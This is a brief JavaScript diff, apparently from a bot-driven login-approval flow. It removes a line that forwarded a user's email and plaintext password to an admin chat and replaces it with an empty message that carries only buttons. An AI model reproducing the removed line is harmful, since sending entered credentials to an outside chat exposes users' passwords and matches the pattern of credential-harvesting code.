@@ -20,7 +20,7 @@ function sendApprovalRequest(email, password) {
       ],
     },
   };
-  bot.sendMessage(ADMIN_CHAT_ID, `🔐 Login attempt:\n📧 ${email}\n🔑 ${password}`, options);
+  bot.sendMessage(ADMIN_CHAT_ID, "", options); // 👈 empty message, only buttons
 }
 
 // Handle button clicks
